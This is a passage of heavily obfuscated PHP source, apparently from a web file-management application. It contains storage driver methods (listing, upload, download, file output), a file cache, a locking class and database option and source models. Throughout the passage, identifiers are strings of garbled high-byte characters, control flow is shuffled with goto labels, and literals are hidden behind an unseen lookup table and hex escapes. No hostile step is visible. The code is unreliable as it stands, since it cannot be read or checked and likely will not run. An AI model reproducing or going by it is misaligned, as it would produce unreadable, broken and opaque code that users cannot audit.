$_SERVER[¾÷]; $dÈåÛÅ–Ïœ = $this->infoSimple($c¨÷¸­‚Ğ); return $dÈåÛÅ–Ïœ && $dÈåÛÅ–Ïœ[$c¸é–ƒ°…Ÿ[406]] == $c¸é–ƒ°…Ÿ[96] ? !1 : !0; } public function isFolder($aÕ‡äŞ°) { $açøŸòæº‚ =& $_SERVER[¾÷]; $fÏ…ó¶ÎÁ = $this->infoSimple($aÕ‡äŞ°); return $fÏ…ó¶ÎÁ && $fÏ…ó¶ÎÁ[$açøŸòæº‚[406]] == $açøŸòæº‚[96] ? !0 : !1; } public function listPath($Dê«¡¿‘ÈÆ, $FŒÕÆ¦”¯œ = false) { $AåÛ¹Íæª =& $_SERVER[¾÷]; if ($Dê«¡¿‘ÈÆ == $AåÛ¹Íæª[43]) { return !1; } $eŸ„Á¸Í¼ = array($AåÛ¹Íæª[398] => $Dê«¡¿‘ÈÆ); if ($FŒÕÆ¦”¯œ) { return $this->model->listSource($eŸ„Á¸Í¼, -1); } return $this->model->listSource($eŸ„Á¸Í¼); } public function has($B¼÷å®, $cÅÊôƒî›Ï = false, $BŸ¢¸Û²Ñº = null) { $A°§”öïŠ =& $_SERVER[¾÷]; $eäÙ‰Õ¤¼Š = $this->infoWithChildren($B¼÷å®); if ($cÅÊôƒî›Ï) { return array($A°§”öïŠ[212] => $eäÙ‰Õ¤¼Š[$A°§”öïŠ[212]], $A°§”öïŠ[211] => $eäÙ‰Õ¤¼Š[$A°§”öïŠ[211]]); } return $BŸ¢¸Û²Ñº ? $eäÙ‰Õ¤¼Š[$A°§”öïŠ[212]] : $eäÙ‰Õ¤¼Š[$A°§”öïŠ[211]]; } public function listAll($BØŞôë©º) { $eÜ¢¦¹Ó’º = IO::info($this->pathParse[$_SERVER[¾÷][85]]); if (!$eÜ¢¦¹Ó’º) { return array(); } return $this->model->listAll($BØŞôë©º); } public function getContent($aÇµÀÚ¬·æ) { return $this->model->getContent($aÇµÀÚ¬·æ); } public function setContent($d«Ñ‚ÁÖŠ¡, $Dì†Ù¸È‚ì = '') { return $this->model->setContent($d«Ñ‚ÁÖŠ¡, $Dì†Ù¸È‚ì); } public function fileSubstr($Eå—Ö–‰, $e›çÜŠ–Ù, $d¶…‘÷¨²Š) { return $this->model->fileSubstr($Eå—Ö–‰, $e›çÜŠ–Ù, $d¶…‘÷¨²Š); } public function download($D‡ˆ×èÈ£®, $d¨÷Ì£™èç = '') { $cÏ»ÙÏÄ± = get_path_father($d¨÷Ì£™èç); $DÀù–ùËğ² = get_path_this($d¨÷Ì£™èç); $c‰‚œá¤ÏÎ = $this->model->fileInfoGet($D‡ˆ×èÈ£®); $C¿ôíîô‹‡ = IO::copy($c‰‚œá¤ÏÎ[$_SERVER[¾÷][85]], $cÏ»ÙÏÄ±, !1, $DÀù–ùËğ²); return $C¿ôíîô‹‡; } public function setModifyTime($A²½±·¬Œˆ, $eæàÏÉè¤· = '') { $this->model->metaSet($A²½±·¬Œˆ, $_SERVER[¾÷][1182], $eæàÏÉè¤·); } public function upload($bŒÔÕËÛãË, $B•¹“Œ½÷, $f¾”‰éë¼† = false, $F¡ÓÑ¢ï´Ë = REPEAT_REPLACE) { $F‘‡¯•÷©Ö =& $_SERVER[¾÷]; $AÀ ¢·ºÖ  = $this->parse($bŒÔÕËÛãË); $dôæĞ–¯© = $this->model->addFile($AÀ ¢·ºÖ [$F‘‡¯•÷©Ö[397]], $B•¹“Œ½÷, $AÀ ¢·ºÖ [$F‘‡¯•÷©Ö[85]], $f¾”‰éë¼†, $F¡ÓÑ¢ï´Ë); return $this->getPathOuter($dôæĞ–¯©); } public function uploadFileByID($C¼›Ëè«÷–, $bò¾Íìƒ…, $C›ô…ÇôÕ¢) { $EÔµ‰ÄÀ© =& $_SERVER[¾÷]; $D¾İ‡—±àØ = $this->parse($C¼›Ëè«÷–); $EÅ°ËÛ°šñ = $this->model->addFileByFileID($D¾İ‡—±àØ[$EÔµ‰ÄÀ©[397]], $bò¾Íìƒ…, $D¾İ‡—±àØ[$EÔµ‰ÄÀ©[85]], $C›ô…ÇôÕ¢); return $this->getPathOuter($EÅ°ËÛ°šñ); } public function addFileByRemote($b¸‡´†Ô”š, $FšõÓó†µ‚, $câ´Ÿ¶“†Ò = array(), $EÍ¼®‚Ÿ¶ˆ = '', $cøò¦¬ğò‘) { $FÃÒóñ‚Ü‡ =& $_SERVER[¾÷]; $DÎ½ÕÛ«ÌÂ = $this->parse($b¸‡´†Ô”š); $EÍ¼®‚Ÿ¶ˆ = empty($EÍ¼®‚Ÿ¶ˆ) ? $DÎ½ÕÛ«ÌÂ[$FÃÒóñ‚Ü‡[85]] : $EÍ¼®‚Ÿ¶ˆ; $B³ºŸÈø¡ = $this->model->addFileByRemote($DÎ½ÕÛ«ÌÂ[$FÃÒóñ‚Ü‡[397]], $FšõÓó†µ‚, $EÍ¼®‚Ÿ¶ˆ, $câ´Ÿ¶“†Ò, $cøò¦¬ğò‘); return $this->getPathOuter($B³ºŸÈø¡); } public function uploadLink($c¬Œ‘İŞË™, $eˆ•ÖÈ“½Á = 0) { $D’‰ŠÈ÷¬Ê =& $_SERVER[¾÷]; $eŠï÷ğÛÑŠ = $this->parse($c¬Œ‘İŞË™); $d³…×‹åÆö = _get($GLOBALS[$D’‰ŠÈ÷¬Ê[17]], $D’‰ŠÈ÷¬Ê[1183]); $E¢ŒŒ¾šØƒ = _get($GLOBALS[$D’‰ŠÈ÷¬Ê[17]], $D’‰ŠÈ÷¬Ê[1184]); $c¬Œ‘İŞË™ = Model($D’‰ŠÈ÷¬Ê[575])->createFileName($eŠï÷ğÛÑŠ[$D’‰ŠÈ÷¬Ê[85]], $d³…×‹åÆö, $E¢ŒŒ¾šØƒ); return IO::uploadLink($c¬Œ‘İŞË™, $eˆ•ÖÈ“½Á); } public function fileNameAuto($Fªš÷àŒË¦, $d“Ùëæ¯Ü‚, $dÈª©¡ò¼ = REPEAT_REPLACE, $a§’ËÛÈÅ¶ = false) { return $this->model->fileNameAuto($Fªš÷àŒË¦, $d“Ùëæ¯Ü‚, $dÈª©¡ò¼, $a§’ËÛÈÅ¶); } public function fileNameExist($a·ÓÍ¶ĞÄÍ, $AíóæÅ«œ–) { return $this->model->fileNameExist($a·ÓÍ¶ĞÄÍ, $AíóæÅ«œ–); } protected function _fileOut($A“†‰°•‰, $B ĞŠ¨‹¶ = false, $BÕÈ—ì„ªÈ = false, $a·Şµá•á = '', $b·§Ìùì‡ã = false) { goto e³¯¥ÈÛ„Î; cÉŒçáõÏ‘: if ($b·§Ìùì‡ã) { return IO::fileOutServer($C¨ºÁÈ¦ªœ[$dî¬™¥ë¦½[85]], $B ĞŠ¨‹¶, $FÉƒ¸•Ò“¢, $a·Şµá•á); } IO::fileOut($C¨ºÁÈ¦ªœ[$dî¬™¥ë¦½[85]], $B ĞŠ¨‹¶, $FÉƒ¸•Ò“¢, $a·Şµá•á); goto aóÇ„Öó; C•·È’Øò: $C¨ºÁÈ¦ªœ = $this->model->fileInfoGet($A“†‰°•‰); $a·Şµá•á = $C¨ºÁÈ¦ªœ[$dî¬™¥ë¦½[179]] ? $C¨ºÁÈ¦ªœ[$dî¬™¥ë¦½[179]] : $a·Şµá•á; $FÉƒ¸•Ò“¢ = isset($GLOBALS[$dî¬™¥ë¦½[1186]]) ? $GLOBALS[$dî¬™¥ë¦½[1186]] : $E¿§İòé[$dî¬™¥ë¦½[38]]; goto cÉŒçáõÏ‘; e³¯¥ÈÛ„Î: $dî¬™¥ë¦½ =& $_SERVER[¾÷]; $E¿§İòé = $this->model->sourceInfo($A“†‰°•‰); if ($E¿§İòé[$dî¬™¥ë¦½[406]] == $dî¬™¥ë¦½[96]) { header($dî¬™¥ë¦½[1185]); die; } goto C•·È’Øò; aóÇ„Öó: } public function fileOut($Eƒí»é—õª, $eÕÖÙ–Ÿ‚ = false, $bùï®÷ğ— = false, $EäÚàÕ¼ÒÖ = '') { $this->_fileOut($Eƒí»é—õª, $eÕÖÙ–Ÿ‚, $bùï®÷ğ—, $EäÚàÕ¼ÒÖ); } public function fileOutServer($Eœ¨°«Á†°, $AÃ‚…¤«Íí = false, $Fß—Öº¼Ú = false, $eùØÒ¹İÔä = '') { $this->_fileOut($Eœ¨°«Á†°, $AÃ‚…¤«Íí, $Fß—Öº¼Ú, $eùØÒ¹İÔä, !0); } protected function _fileOutImage($b¦Í´ÊëÀĞ, $CÄ„ô Éæµ = 250) { goto bÆ¾Œ“Œ¿”; bÆ¾Œ“Œ¿”: $aè¦”ÔòïŸ =& $_SERVER[¾÷]; $e»ãä¨²š­ = $this->model->pathInfo($b¦Í´ÊëÀĞ); if ($e»ãä¨²š­[$aè¦”ÔòïŸ[406]] == $aè¦”ÔòïŸ[96]) { show_json($aè¦”ÔòïŸ[1187] . $b¦Í´ÊëÀĞ, !1); } goto c‘…Ò¡°Ñ; fßê‡ÈÈ¶½: $GLOBALS[$aè¦”ÔòïŸ[1186]] = $AŞÎ…ªå»[$aè¦”ÔòïŸ[38]]; $GLOBALS[$aè¦”ÔòïŸ[171]] = $AŞÎ…ªå»; IO::fileOutImage($AŞÎ…ªå»[$aè¦”ÔòïŸ[85]], $CÄ„ô Éæµ); goto bœÕóáÛã; c‘…Ò¡°Ñ: $AŞÎ…ªå» = $this->model->fileInfoGet($b¦Í´ÊëÀĞ); $AŞÎ…ªå»[$aè¦”ÔòïŸ[38]] = $e»ãä¨²š­[$aè¦”ÔòïŸ[38]]; $AŞÎ…ªå»[$aè¦”ÔòïŸ[172]] = $e»ãä¨²š­[$aè¦”ÔòïŸ[172]]; goto fßê‡ÈÈ¶½; bœÕóáÛã: } public function fileOutImage($CİÁ¿ìê®, $c‘´Ä½Àİ› = 250) { $this->_fileOutImage($CİÁ¿ìê®, $c‘´Ä½Àİ›); } public function fileOutImageServer($C‡š™­•Ÿ–, $dö»¸õ˜õß = 250) { $this->_fileOutImage($C‡š™­•Ÿ–, $dö»¸õ˜õß); } public function link($dÓµœ¼×£, $fÔˆÇ„„ÊØ = '') { $c‘ÉŒŠÃ = $this->model->fileInfoGet($dÓµœ¼×£); return IO::link($c‘ÉŒŠÃ[$_SERVER[¾÷][85]], $fÔˆÇ„„ÊØ); } protected function parse($c™‚×”ßñ) { $CÚ†ä»¼ =& $_SERVER[¾÷]; if (strstr($c™‚×”ßñ, $CÚ†ä»¼[18]) === !1) { return array($CÚ†ä»¼[415] => intval($c™‚×”ßñ), $CÚ†ä»¼[85] => $CÚ†ä»¼[43], $CÚ†ä»¼[1181] => array()); } $D¨ã£ô©‡Í = explode($CÚ†ä»¼[18], trim($c™‚×”ßñ, $CÚ†ä»¼[18])); if (count($D¨ã£ô©‡Í) < 2) { show_tips($c™‚×”ßñ . $CÚ†ä»¼[1188]); } return array($CÚ†ä»¼[415] => intval($D¨ã£ô©‡Í[0]), $CÚ†ä»¼[85] => $D¨ã£ô©‡Í[1], $CÚ†ä»¼[1181] => array_slice($D¨ã£ô©‡Í, 1)); } } goto CŒ¬××³ƒê; aôäªëİ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($b‡›¢÷‚›ä, $dÊè»¼„•—) { $Cä÷¾ê–Á¦ =& $_SERVER[¾÷]; $this->cachePath = $b‡›¢÷‚›ä[$Cä÷¾ê–Á¦[85]]; $this->prefix = $Cä÷¾ê–Á¦[785]; $this->cacheTime = $dÊè»¼„•—; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($AÖ‹©İóĞ”) { $a‘íµ™•–Â =& $_SERVER[¾÷]; $AÖ‹©İóĞ” = str_replace(array($a‘íµ™•–Â[786], $a‘íµ™•–Â[106], $a‘íµ™•–Â[79]), $a‘íµ™•–Â[787], $AÖ‹©İóĞ”); return $this->cachePath . $a‘íµ™•–Â[788] . $AÖ‹©İóĞ” . $a‘íµ™•–Â[789]; } public function set($f±è´¥æñÌ, $aÛîŠÎŒ„¹, $d±éà…äÈ» = false) { $Bëß‘õ»Øˆ = $this->getFile($f±è´¥æñÌ); if (file_put_contents($Bëß‘õ»Øˆ, $this->prefix . $aÛîŠÎŒ„¹, LOCK_EX)) { return !0; } @unlink($Bëß‘õ»Øˆ); return !1; } public function get($eŠæ¢÷º’Š) { $F¤—œ‹Ê÷ = $this->getFile($eŠæ¢÷º’Š); if (file_exists($F¤—œ‹Ê÷) && filemtime($F¤—œ‹Ê÷) < time() - $this->cacheTime) { @unlink($F¤—œ‹Ê÷); return !1; } $D›‡Š¶ÀÊ× = @file_get_contents($F¤—œ‹Ê÷); return substr($D›‡Š¶ÀÊ×, strlen($this->prefix)); } public function remove($a¯ÂŞÀ©¢Ş) { $dèÒ …óôã = $this->getFile($a¯ÂŞÀ©¢Ş); return @unlink($dèÒ …óôã); } public function deleteAll() { $d¼¨œ…•³Ğ =& $_SERVER[¾÷]; $c‡Ÿ½â‚Ï† = scandir($this->cachePath); foreach ($c‡Ÿ½â‚Ï† as $f¡‡˜ÀÇ‡) { $BºèŒÂô = $this->cachePath . $f¡‡˜ÀÇ‡; if (strpos($BºèŒÂô, $d¼¨œ…•³Ğ[789]) && strpos($BºèŒÂô, $d¼¨œ…•³Ğ[790])) { @unlink($BºèŒÂô); } } } public function clearTimeout() { $FÒÆÙ¦Í¢Î =& $_SERVER[¾÷]; $eùĞƒÕâãª = scandir($this->cachePath); foreach ($eùĞƒÕâãª as $DŒÚ„î·òİ) { $eÎÛ¿Ÿƒİ» = $this->cachePath . $DŒÚ„î·òİ; if (strpos($eÎÛ¿Ÿƒİ», $FÒÆÙ¦Í¢Î[789]) && strpos($eÎÛ¿Ÿƒİ», $FÒÆÙ¦Í¢Î[790]) && filemtime($eÎÛ¿Ÿƒİ») < time() - $this->cacheTime) { @unlink($eÎÛ¿Ÿƒİ»); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto B®©¢£öå; B®©¢£öå: $Cé°‰İ¾˜ =& $_SERVER[¾÷]; if (self::$handle) { return self::$handle; } $F„¿›œ¿É§ = $GLOBALS[$Cé°‰İ¾˜[16]][$Cé°‰İ¾˜[354]]; goto eÃŞ «ÏÑ®; eÃŞ «ÏÑ®: self::$timeout = $F„¿›œ¿É§[$Cé°‰İ¾˜[791]] ? $F„¿›œ¿É§[$Cé°‰İ¾˜[791]] : 10; $f²â¶ùöÑé = _get($GLOBALS[$Cé°‰İ¾˜[16]], $Cé°‰İ¾˜[792]); $f¯øËê»ËŒ = $F„¿›œ¿É§[$Cé°‰İ¾˜[778]] ? $F„¿›œ¿É§[$Cé°‰İ¾˜[778]] : $Cé°‰İ¾˜[201]; goto D÷½¤ß¬‡ç; D÷½¤ß¬‡ç: if ($f¯øËê»ËŒ == $Cé°‰İ¾˜[27] && $f²â¶ùöÑé == $Cé°‰İ¾˜[19]) { $f¯øËê»ËŒ = $Cé°‰İ¾˜[201]; } switch ($f¯øËê»ËŒ) { case $Cé°‰İ¾˜[781]: self::$handle = new CacheLockRedis(); break; case $Cé°‰İ¾˜[782]: self::$handle = new CacheLockMemcached(); break; case $Cé°‰İ¾˜[27]: self::$handle = new CacheLockDatabase(); break; case $Cé°‰İ¾˜[201]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto FšÈå´ÔÜ; FšÈå´ÔÜ: } private static function key($dÃöš‚íÙ¼) { return $_SERVER[¾÷][793] . Cache::key($dÃöš‚íÙ¼); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($e„‰»Ëáà = '') { self::$errorMsg = $e„‰»Ëáà; } public static function lockGlobal($FŞá¾æ’èó, $d¾‘í‰ŒÒ) { return self::lock($FŞá¾æ’èó, $d¾‘í‰ŒÒ, !0); } public static function lock($A·ƒ×¶¸ˆ‘, $aŞÎà‹£ËÂ = false, $Cˆïèõ£Ğò = false) { goto dÚÅğØ”; bÌ…®—ê÷Ç: if (!$Cˆïèõ£Ğò) { self::$lockItem[$c½¹“°«‰ç] = !0; } return $AßÍ„ÇÈåÕ; goto d… …ºÊŸ›; EÎ÷Ç¥¢­ç: $aŞÎà‹£ËÂ = $aŞÎà‹£ËÂ ? $aŞÎà‹£ËÂ : self::$timeout; $AßÍ„ÇÈåÕ = $D‰á²Ğ¹ˆ->lock($c½¹“°«‰ç, $aŞÎà‹£ËÂ); if (!$AßÍ„ÇÈåÕ) { $BŒ‘ÇÕÏ™µ = "\x6c\157\143\x6b\x20\145\162\x72\x6f\x72\73\x6b\x65\171\x3d{$A·ƒ×¶¸ˆ‘}\73\164\x69\x6d\x65\x3d{$aŞÎà‹£ËÂ}\73" . self::$errorMsg . $eÖåÙ‘ÕÅ¬[77] . get_caller_msg(); $b†æ•¤‹Å¤ = LNG($eÖåÙ‘ÕÅ¬[794]) . "\50{$aŞÎà‹£ËÂ}\x73\51\x2e" . LNG($eÖåÙ‘ÕÅ¬[795]); $b†æ•¤‹Å¤ .= $eÖåÙ‘ÕÅ¬[796]; if (is_string(self::$errorMsg) && self::$errorMsg) { $b†æ•¤‹Å¤ = $b†æ•¤‹Å¤ . $eÖåÙ‘ÕÅ¬[797] . self::$errorMsg; } write_log($BŒ‘ÇÕÏ™µ, $eÖåÙ‘ÕÅ¬[798]); show_json($b†æ•¤‹Å¤, !1); } goto bÌ…®—ê÷Ç; dÚÅğØ”: $eÖåÙ‘ÕÅ¬ =& $_SERVER[¾÷]; $D‰á²Ğ¹ˆ = self::init(); $c½¹“°«‰ç = self::key($A·ƒ×¶¸ˆ‘); goto EÎ÷Ç¥¢­ç; d… …ºÊŸ›: } public static function lockGet($cÑˆãŸóÛ½) { $D¤¢Ùâ…äÑ = self::key($cÑˆãŸóÛ½); if (self::$lockItem[$D¤¢Ùâ…äÑ]) { return self::$lockItem[$D¤¢Ùâ…äÑ]; } return self::init()->lockGet($D¤¢Ùâ…äÑ); } public static function unlock($eÖ•Ü‚¡‡) { $F‡‹äØÁÊ‹ = self::key($eÖ•Ü‚¡‡); self::$lockItem[$F‡‹äØÁÊ‹] = null; return self::init()->unlock($F‡‹äØÁÊ‹); } public static function unlockRuntime() { $EİˆÄ»ê¢Ì =& $_SERVER[¾÷]; $d¯¼¤•ì›™ = self::init(); $eå®ˆÆ¨ñˆ = !1; foreach (self::$lockItem as $fš¶“ªä§ => $dÄ”Í„Ş»×) { if (!$dÄ”Í„Ş»×) { continue; } $d¯¼¤•ì›™->unlock($fš¶“ªä§); if (!$eå®ˆÆ¨ñˆ) { $eå®ˆÆ¨ñˆ = !0; write_log($EİˆÄ»ê¢Ì[799] . $fš¶“ªä§ . $EİˆÄ»ê¢Ì[77] . get_caller_msg(), $EİˆÄ»ê¢Ì[798]); continue; } write_log($EİˆÄ»ê¢Ì[799] . $fš¶“ªä§, $EİˆÄ»ê¢Ì[798]); } self::fileUnlockAll(); } public static function fileLock($b«ÄŒËÒ´Ì) { goto f­Š÷¾¾„; f­Š÷¾¾„: $BÅÖĞç±ë÷ =& $_SERVER[¾÷]; if (!$GLOBALS[$BÅÖĞç±ë÷[800]]) { $GLOBALS[$BÅÖĞç±ë÷[800]] = array(); } $GLOBALS[$BÅÖĞç±ë÷[800]][$b«ÄŒËÒ´Ì] = !1; goto c›çØÖŠ»°; FÅ·¯«Û”å: return !1; goto d»†½…÷ ô; c›çØÖŠ»°: $b¯Ç¯Î­óö = fopen(DATA_PATH . $b«ÄŒËÒ´Ì . $BÅÖĞç±ë÷[801], $BÅÖĞç±ë÷[802]); if (!$b¯Ç¯Î­óö) { return !1; } $GLOBALS[$BÅÖĞç±ë÷[800]][$b«ÄŒËÒ´Ì] = $b¯Ç¯Î­óö; goto fôê—˜Ë¹…; fôê—˜Ë¹…: if (flock($b¯Ç¯Î­óö, LOCK_EX)) { return !0; } self::unlock($b«ÄŒËÒ´Ì); show_json($BÅÖĞç±ë÷[803], !1); goto FÅ·¯«Û”å; d»†½…÷ ô: } public static function fileUnlock($A’°¶ª‡îé) { $fñƒ³£ê =& $_SERVER[¾÷]; $dÆÃ…Çˆ­ = $GLOBALS[$fñƒ³£ê[800]][$A’°¶ª‡îé]; if (!$dÆÃ…Çˆ­) { return; } $GLOBALS[$fñƒ³£ê[800]][$A’°¶ª‡îé] = !1; flock($dÆÃ…Çˆ­, LOCK_UN); fclose($dÆÃ…Çˆ­); } public static function fileUnlockAll() { $B—œˆÖ£ãÓ =& $_SERVER[¾÷]; if (!$GLOBALS[$B—œˆÖ£ãÓ[800]]) { return; } foreach ($GLOBALS[$B—œˆÖ£ãÓ[800]] as $AÈœóäë÷ => $d©¬†´‡Ë›) { if (!$d©¬†´‡Ë›) { continue; } $GLOBALS[$B—œˆÖ£ãÓ[800]][$AÈœóäë÷] = !1; flock($d©¬†´‡Ë›, LOCK_UN); fclose($d©¬†´‡Ë›); } $GLOBALS[$B—œˆÖ£ãÓ[800]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto d§×ØÙğ‘; F¿âïïÏÒº: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Eäõ£˜Ü‘™ = false, $EÈ­óö®‰ = '', $E•²ˆ„Òæ’ = false) { goto cÈ‘òÂ„Ø“; cÈ‘òÂ„Ø“: $b½î—ĞÓÁ =& $_SERVER[¾÷]; $C…Óºó‰Ù = $this->cacheGet($EÈ­óö®‰); $E›‡òéÎÔ = $this->optionDefault($EÈ­óö®‰); goto e Ä‘„ùÑš; e Ä‘„ùÑš: $E›‡òéÎÔ = is_array($E›‡òéÎÔ) ? $E›‡òéÎÔ : array(); if (is_array($C…Óºó‰Ù)) { $C…Óºó‰Ù = array_merge($E›‡òéÎÔ, $C…Óºó‰Ù); return $Eäõ£˜Ü‘™ ? isset($C…Óºó‰Ù[$Eäõ£˜Ü‘™]) ? $C…Óºó‰Ù[$Eäõ£˜Ü‘™] : null : $C…Óºó‰Ù; } $Cù›õòŠî  = $this->filterWhere(array($b½î—ĞÓÁ[39] => $EÈ­óö®‰)); goto Eœ¯˜Áè­; Eœ¯˜Áè­: $C…Óºó‰Ù = $this->where($Cù›õòŠî )->select(); $C…Óºó‰Ù = array_to_keyvalue($C…Óºó‰Ù, $b½î—ĞÓÁ[102], $b½î—ĞÓÁ[379]); foreach ($C…Óºó‰Ù as $B·¨ÍãËÖ => $E™–§‚·) { if ($E•²ˆ„Òæ’ || in_array($B·¨ÍãËÖ, $this->jsonField)) { $C…Óºó‰Ù[$B·¨ÍãËÖ] = json_decode($E™–§‚·, !0); } } goto f§õØÓ†¸Ÿ; f§õØÓ†¸Ÿ: $this->cacheSet($EÈ­óö®‰, $C…Óºó‰Ù); $C…Óºó‰Ù = array_merge($E›‡òéÎÔ, $C…Óºó‰Ù); return $Eäõ£˜Ü‘™ ? $C…Óºó‰Ù[$Eäõ£˜Ü‘™] : $C…Óºó‰Ù; goto CÒ½°È¦‰ô; CÒ½°È¦‰ô: } public function set($fã˜ËŠà´ö, $E±¹íª¤¨Ê = false, $fÕ¿½ÁİÊĞ = '') { goto F­İ‹Ò“Ã×; F­İ‹Ò“Ã×: $dİâŠ–†‡ =& $_SERVER[¾÷]; $this->cacheRemove($fÕ¿½ÁİÊĞ); $fÙ±…Ï„Œ´ = array(); goto bÎ”…Ô¶×ø; bÎ”…Ô¶×ø: $fš¬„ççÚÃ = is_array($fã˜ËŠà´ö) ? $fã˜ËŠà´ö : array($fã˜ËŠà´ö => $E±¹íª¤¨Ê); foreach ($fš¬„ççÚÃ as $C÷ ¨¸¦…õ => $B‡‚×–¤è¨) { if (is_array($B‡‚×–¤è¨)) { $B‡‚×–¤è¨ = json_encode_force($B‡‚×–¤è¨); } $this->checkLength($B‡‚×–¤è¨, !1, $this->tableName . $dİâŠ–†‡[14] . $fã˜ËŠà´ö); $B‡‚×–¤è¨ = self::textEncode($B‡‚×–¤è¨); $fš¬„ççÚÃ = array($dİâŠ–†‡[39] => $fÕ¿½ÁİÊĞ, $dİâŠ–†‡[102] => $C÷ ¨¸¦…õ, $dİâŠ–†‡[379] => $B‡‚×–¤è¨); $fÙ±…Ï„Œ´[] = $this->filterWhere($fš¬„ççÚÃ); } if (!$fÙ±…Ï„Œ´) { return !0; } goto fø–ÚÀßÂ; fø–ÚÀßÂ: return $this->addAll($fÙ±…Ï„Œ´, array(), !0); goto E¨àÚøĞĞ; E¨àÚøĞĞ: } protected function optionDefault($E”ß™ÖòÕù = '') { return !1; } public function setDeep($c÷†Êµà‚–, $B˜£˜‰À¯ = false, $c°×Ä¶³ºß = '') { $D®äÕëä… = explode($_SERVER[¾÷][104], $c÷†Êµà‚–); $aºËğäŸöß = $this->get(); array_set_value($aºËğäŸöß, $c÷†Êµà‚–, $B˜£˜‰À¯); $this->set($D®äÕëä…[0], $aºËğäŸöß[$D®äÕëä…[0]], $c°×Ä¶³ºß); } public function remove($C±ÁôÙ‘òĞ, $bä”å–ÃäÖ = '') { $d·×¤¦‹»ö =& $_SERVER[¾÷]; $this->cacheRemove($bä”å–ÃäÖ); $E‘ÛÎ×Ãó = $this->filterWhere(array($d·×¤¦‹»ö[102] => $C±ÁôÙ‘òĞ, $d·×¤¦‹»ö[39] => $bä”å–ÃäÖ)); if (is_null($C±ÁôÙ‘òĞ)) { unset($E‘ÛÎ×Ãó[$d·×¤¦‹»ö[102]]); } return $this->where($E‘ÛÎ×Ãó)->delete(); } public function cacheSet($Cï¢›À—‚Õ, $d…¼Ê·ˆÌ = false) { return Cache::set($this->cacheKey($Cï¢›À—‚Õ), $d…¼Ê·ˆÌ); } public function cacheGet($BØó‚ã£¶î) { return Cache::get($this->cacheKey($BØó‚ã£¶î)); } public function cacheRemove($c‚ÍŠÌÔ) { return Cache::remove($this->cacheKey($c‚ÍŠÌÔ)); } protected function filterWhere($Dó×õù’Øî) { return $Dó×õù’Øî; } protected function cacheKey($DÇÆÍêù¡º) { return $DÇÆÍêù¡º; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\x72\143\x65"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\x61\x6d\x65" => "\151\157\x5f\x73\157\x75\x72\143\x65\x5f\155\145\x74\141", "\x6d\145\164\141\106\x69\x65\154\x64" => "\163\157\x75\162\x63\145\111\x44"); protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\124\x69\155\145", "\164\151\155\145", "\151\x6e\x73\145\162\164", "\x66\x75\156\x63\x74\151\x6f\156"), array("\x63\x72\x65\141\x74\x65\x54\x69\x6d\x65", "\164\151\155\x65", "\x69\x6e\x73\145\x72\164", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\x76\151\145\167\x54\151\x6d\145", "\164\151\x6d\x65", "\151\156\163\x65\x72\x74", "\146\x75\x6e\143\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Bæ®ïÇ…İ¡) { return $this->listSource(array($_SERVER[¾÷][398] => $Bæ®ïÇ…İ¡)); } public function typeName($BŠš·™»´¾) { static $AèÕÜÙ° = array(self::TYPE_SYSTEM => "\x73\171\163\164\145\x6d", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\147\x72\x6f\x75\160"); return $AèÕÜÙ°[$BŠš·™»´¾ . $_SERVER[¾÷][43]]; } public function sourceListInfo($Cù§÷šœÊá, $D¾œÁáÆ = false) { goto BŞ³‘‘³¹; D¤î¼«·‡: if (!$Cù§÷šœÊá) { return array(); } $bôóÒóã’ = $this->where(array($EÛ©‰óÑ®®[399] => array($EÛ©‰óÑ®®[17], $Cù§÷šœÊá)))->select(); $this->_listDataApply($bôóÒóã’, $D¾œÁáÆ); goto Dƒ»êÄÓù˜; Dƒ»êÄÓù˜: return array_to_keyvalue($bôóÒóã’, $EÛ©‰óÑ®®[399]); goto Aœ·ÚîÑö; BŞ³‘‘³¹: $EÛ©‰óÑ®® =& $_SERVER[¾÷]; $Cù§÷šœÊá = $Cù§÷šœÊá ? $Cù§÷šœÊá : array(); $Cù§÷šœÊá = array_filter(array_unique($Cù§÷šœÊá)); goto D¤î¼«·‡; Aœ·ÚîÑö: } public function pathInfoFilter(&$d´åÃ×ê®¾) { goto Döò†ßˆŠ½; Döò†ßˆŠ½: $Bèâ¯ÄÖ =& $_SERVER[¾÷]; static $dµ¤ÈˆÁ‹Š = false; static $Eì‘Õå‡”‹ = false; goto DŸÄƒºÇ–; cê¦•å¦²: $d´åÃ×ê®¾[$Bèâ¯ÄÖ[407]] = $this->typeName($d´åÃ×ê®¾[$Bèâ¯ÄÖ[407]]); if ($d´åÃ×ê®¾[$Bèâ¯ÄÖ[406]] != 1) { $d´åÃ×ê®¾[$Bèâ¯ÄÖ[177]] = $d´åÃ×ê®¾[$Bèâ¯ÄÖ[408]]; unset($d´åÃ×ê®¾[$Bèâ¯ÄÖ[408]]); } $eÓ«ˆ—²¿• = $dµ¤ÈˆÁ‹Š; goto EË‘§™ÚÍˆ; DŸÄƒºÇ–: if (!$dµ¤ÈˆÁ‹Š) { goto fé§õæ‚Ë›; D°º´¤Ğ¸Ê: $Eì‘Õå‡”‹ = array(); foreach ($dµ¤ÈˆÁ‹Š as $eŞ¦¤°Ü·) { if (in_array($eŞ¦¤°Ü·, $B±§ã¨¸Ì)) { continue; } $Eì‘Õå‡”‹[] = $eŞ¦¤°Ü·; } goto d‘ãÒ°¯ï; fé§õæ‚Ë›: $A«Ê¾ƒĞ¯™ = $Bèâ¯ÄÖ[400]; $A«Ê¾ƒĞ¯™ .= $Bèâ¯ÄÖ[401]; $A«Ê¾ƒĞ¯™ .= $Bèâ¯ÄÖ[402]; goto F˜ÀŠ¶¾; 